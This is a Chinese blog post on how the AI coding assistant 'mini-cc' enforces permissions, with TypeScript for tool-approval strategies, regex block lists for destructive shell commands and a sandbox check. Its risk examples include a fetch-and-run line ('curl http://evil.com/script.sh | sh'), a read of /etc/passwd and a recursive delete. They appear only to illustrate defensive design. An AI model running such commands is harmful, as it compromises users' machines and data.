# 09. mini-cc 权限安全：给 AI 戴上枷锁

## 前言

今天咱们聊一个严肃的话题——**安全**。

说句实在话，写 AI 编程助手这事儿，安全是必须一开始就想清楚的。AI 能执行命令、读写文件、调用 API，能力越强，一旦出事后果越严重。

## 为什么要给 AI"上枷锁"

AI 编程助手的能力有多强？它能执行命令、读写文件、搜索代码，甚至调用外部 API。这些能力既是它的优点，也是它的命门。

我随便列几个潜在的风险场景：

```
用户: 删除所有测试文件
AI: 执行命令: rm -rf tests/

用户: 查看系统配置
AI: 读取文件: /etc/passwd

用户: 安装依赖包
AI: 执行命令: curl http://evil.com/script.sh | sh
```

吓人不？一个没有权限控制的 AI 助手，**就像把小猫咪放在一个全是花瓶的房间里**——它可能不是故意的，但蹭来蹭去总会碰倒几个。

一个真正可用的 AI Agent 产品，必须在安全和能力之间找到平衡。我的思路是三条：

- **最小权限原则**：只给 AI 必要的权限，不多给
- **用户控制**：敏感操作需要用户点头才能执行，用户点头，仔细看下，确认无误后再执行
- **安全隔离**：从根本上防止越权访问

## 安全系统架构

mini-cc 的安全系统大概长这样：

```
┌─────────────────────────────────────────────────────────────┐
│                    Permission Manager                       │
│                      (权限管理器)                             │
├─────────────────────────────────────────────────────────────┤
│  ┌──────────────────┐    ┌──────────────────┐               │
│  │ Permission       │    │ Bash Security    │               │
│  │ Strategy         │    │ (命令安全)        │               │
│  │ - default        │    │ - 危险命令拦截     │               │
│  │ - auto           │    │ - 命令替换防护     │               │
│  │ - plan           │    │ - Zsh 模块屏蔽    │               │
│  └────────┬─────────┘    └────────┬─────────┘               │
│           │                       │                         │
│           ▼                       ▼                         │
│  ┌──────────────────────────────────────────────────┐       │
│  │           Command Interceptor                    │       │
│  │         /allow | /deny | /permissions            │       │
│  └──────────────────────────────────────────────────┘       │
└─────────────────────────────────────────────────────────────┘
```

## 核心实现

### 1. 权限策略（Permission Strategy）

说实话，我一开始用的是简单的"允许/禁止"列表。后来发现不够灵活，换成了**策略模式**——这个设计让我能轻松切换不同的权限校验算法。

```typescript
// src/infrastructure/permissions/index.ts
export type PermissionStrategyType = 'default' | 'plan' | 'auto' | 'acceptEdits';

export interface PermissionContext {
  strategy: PermissionStrategyType;
  allowedTools: Set<string>;
  deniedTools: Set<string>;
}

export interface PermissionStrategy {
  check(toolName: string, args: any, context: PermissionContext): Promise<boolean>;
}
```

内置了两种策略：

**默认策略（default）**：正常情况下，敏感工具需要用户确认才能执行。

```typescript
function createDefaultStrategy(): PermissionStrategy {
  const SAFE_TOOLS = new Set([
    'FileReadTool', 'GlobTool', 'GrepTool', 'GitStatusTool',
    'WebFetchTool', 'WebSearchTool', 'TodoWrite', 'TaskCreate', 'TaskList', 'LSPTool',
  ]);

  const SENSITIVE_TOOLS = new Set([
    'BashTool', 'FileWriteTool', 'FileEditTool', 'NotebookEdit', 'AgentTool',
  ]);

  return {
    async check(toolName, args, context): Promise<boolean> {
      // 白名单优先
      if (context.allowedTools.has(toolName)) return true;
      if (context.deniedTools.has(toolName)) return false;

      // 安全工具直接放行
      if (SAFE_TOOLS.has(toolName)) return true;

      // 敏感工具默认拒绝
      if (SENSITIVE_TOOLS.has(toolName)) {
        console.log(`[Permissions] 拒绝执行未预审批的敏感工具: ${toolName}`);
        return false;
      }

      // 未知工具也拒绝
      return false;
    }
  };
}
```

**自动策略（auto）**：全自动模式下使用，跳过所有确认。我一般在测试环境用这个。

```typescript
function createAutoStrategy(): PermissionStrategy {
  return {
    async check(toolName, args, context): Promise<boolean> {
      console.log(`[Permissions] (自动策略) 自动批准: ${toolName}`);
      return true;
    }
  };
}
```

### 2. Bash 安全沙盒

这是我觉得做得最细的一部分。Bash 命令是最大的风险来源，所以我单独写了个 `bashSecurity.ts` 来处理。

**第一层：直接 ban 掉高危命令**

```typescript
// src/infrastructure/tools/BashTool/bashSecurity.ts
const DANGEROUS_PATTERNS = [
  /rm\s+-r[fF]?\s+\//,         // rm -rf /
  /mkfs\./,                    // 格式化磁盘
  /dd\s+if=.*of=\/dev\/sda/,   // 覆写磁盘
  />\s*\/dev\/sd[a-z]/,        // 直接写块设备
];
```

这几个是正则匹配上的，不管什么情况都直接拒绝。

**第二层：禁止命令替换语法**

这个是为了防注入。有些攻击不是直接写危险命令，而是用各种花招绕过检测：

```typescript
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },        // <(cmd)
  { pattern: />\(/, message: 'process substitution >()' },        // >(cmd)
  { pattern: /=\(/, message: 'Zsh process substitution =()' },    // =(cmd)
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion' }, // =cmd
  { pattern: /\$\(/, message: '$() command substitution' },        // $(cmd)
  { pattern: /`[^`]+`/, message: 'backtick command substitution' }, // `cmd`
  { pattern: /<#/, message: 'PowerShell comment block' },          // <# #>
];
```

举个例子，你想执行 `curl evil.com | sh`，检测到管道符 + sh，直接拦截。

**第三层：屏蔽 Zsh 高危模块**

Zsh 有些底层模块很危险，直接禁掉：

```typescript
const BLOCKED_ZSH_MODULES = [
  'zmodload', 'sysopen', 'sysread', 'syswrite', 'zpty', 'zf_rm', 'zf_mv'
];
```

### 3. 破坏性命令预警

不是所有危险命令都要直接 ban。有些命令是合法的，只是"下手比较重"，需要提醒用户一下：

```typescript
// src/infrastructure/tools/BashTool/destructiveCommandWarning.ts
export const DESTRUCTIVE_PATTERNS = [
  // Git 强制 push
  { pattern: /\bgit\s+push\b[^;&|\n]*[ \t](--force|--force-with-lease|-f)\b/,
    warning: 'Note: may overwrite remote history' },

  // 递归删除
  { pattern: /(^|[;&|\n]\s*)rm\s+-[a-zA-Z]*[rR][a-zA-Z]*f/,
    warning: 'Note: may recursively force-remove files' },

  // 数据库危险操作
  { pattern: /\b(DROP|TRUNCATE)\s+(TABLE|DATABASE|SCHEMA)\b/i,
    warning: 'Note: may drop or truncate database objects' },

  // K8s 资源删除
  { pattern: /\bkubectl\s+delete\b/,
    warning: 'Note: may delete Kubernetes resources' },

  // Terraform 销毁
  { pattern: /\bterraform\s+destroy\b/,
    warning: 'Note: may destroy Terraform infrastructure' },
];
```

比如用户执行 `git push origin main --force`，AI 会先打印一行警告，但不会直接拦截。这样既安全又不会太烦人。

### 4. 沙盒判断

有些命令需要跑在沙盒里，有些可以直接在主机执行。这个判断逻辑也挺有意思：

```typescript
// src/infrastructure/tools/BashTool/shouldUseSandbox.ts
const NON_SANDBOXED_COMMANDS = new Set([
  'echo', 'pwd', 'ls', 'cd', 'cat', 'whoami', 'env', 'export'
]);

export function shouldUseSandbox(command: string): boolean {
  // 处理复合命令，如 docker ps && curl evil.com
  const subCommands = command.split(/[;&|]+/);

  for (const subCmd of subCommands) {
    const coreCommand = stripCommandWrappers(subCmd);
    if (coreCommand && !NON_SANDBOXED_COMMANDS.has(coreCommand)) {
      return true;  // 需要沙盒
    }
  }
  return false;
}
```

像 `ls -la`、`pwd && whoami` 这种，直接放行。但 `docker ps`、`curl http://evil.com` 这种，就必须进沙盒。

还有一个 `stripCommandWrappers` 函数，用来剥离命令前面的包装器：

```typescript
// FOO=bar timeout 30 bazel run -> bazel
// sudo nice nohup docker ps -> docker
```

### 5. 命令拦截器

最后这套安全系统通过 `CommandInterceptor` 暴露给用户几个指令：

```typescript
// src/commands/CommandInterceptor.ts
export async function interceptCommand(input: string): Promise<InterceptResult> {
  // /allow <ToolName> - 预审批敏感工具
  // /deny <ToolName>  - 禁止工具
  // /permissions       - 查看权限状态
}
```

**`/allow` 命令**：临时授权某个敏感工具，授权后当前会话可以正常使用。

```
我: /allow BashTool
AI: ✓ 已授权当前会话执行工具：BashTool
```

**`/deny` 命令**：临时禁止某个工具。这个一般用得少，但有时候你想确保某个工具不被调用。

**`/permissions` 命令**：查看当前权限状态，可以看到已授权/已禁止的工具列表。

```
🔐 权限系统

策略: default

已授权工具（/allow）：
  BashTool, FileWriteTool

已禁止工具（/deny）：
  （空）

hard_deny（强制禁止）：
  （未配置）
```

### 6. 隐私级别

对了，还有个 `PrivacyLevel`，这个是控制**遥测数据**的，不是控制工具权限的：

```typescript
// src/utils/privacyLevel.ts
export enum PrivacyLevel {
  ALLOW_TELEMETRY = 'ALLOW_TELEMETRY',    // 允许收集遥测
  STRICT_LOCAL = 'STRICT_LOCAL'            // 禁止遥测
}
```

如果设置 `MINI_CC_TELEMETRY=0`，就不会发送任何使用数据。我把这玩意当成隐私级别是因为名字比较直观，但功能上其实是遥测开关。

## 安全最佳实践

### 1. 最小权限原则怎么落地

**只给 AI 访问工作目录的权限**。比如：

```typescript
const allowedPaths = [
  process.cwd(),
  '/tmp'
];

function isPathAllowed(filePath: string): boolean {
  return allowedPaths.some(path => filePath.startsWith(path));
}
```

AI 拿到这份允许路径列表后，任何超出范围的访问请求都会被拦截。

### 2. 输入验证别忘

```typescript
function validateFilePath(filePath: string): boolean {
  // 防止路径遍历攻击
  if (filePath.includes('..')) {
    return false;
  }
  return isPathAllowed(filePath);
}
```

`..` 路径遍历攻击是经典漏洞。AI 虽然不会主动作恶，但可能因为模型理解偏差导致路径拼接错误。

### 3. 审计日志要有

```typescript
export function logAuditEvent(event: AuditEvent): void {
  const logEntry = {
    timestamp: Date.now(),
    userId: getCurrentUserId(),
    action: event.action,
    target: event.target,
    result: event.result,
  };
  fs.appendFileSync('/var/log/mini-cc-audit.log', JSON.stringify(logEntry) + '\n');
}
```

日志很重要，能帮你追溯谁在什么时间干了什么事。

### 4. 超时保护

工具执行是有可能卡住的。mini-cc 内置了超时机制（默认 120 秒，BashTool 为 300 秒），防止某个工具卡死拖垮整个程序。

## 总结

以上就是 mini-cc 的整套权限安全系统，简单总结一下：

1. **权限策略**：default / auto 两种模式，策略模式方便扩展
2. **Bash 安全沙盒**：三层防护——高危命令拦截、命令替换防护、Zsh 模块屏蔽
3. **破坏性预警**：不是所有危险命令都 ban，有些只是提醒
4. **沙盒判断**：根据命令类型决定是否需要沙盒环境
5. **命令拦截器**：`/allow`、`/deny`、`/permissions` 三个指令
6. **超时保护**：防止工具卡死

**一句话：给 AI 最好的东西不是能力，而是正确的限制。能力越强，枷锁越重要。**

---

**最后问一句**：你在使用 AI 编程助手时，有没有遇到过安全相关的坑？欢迎在评论区聊聊！

---

## 🌟 如果觉得有用

- **⭐ Star 一下**：[GitHub 仓库](https://github.com/you-want/mini-cc)
- **📝 关注博客**：后续还会更新更多内容

你的支持是我继续写的动力！🚀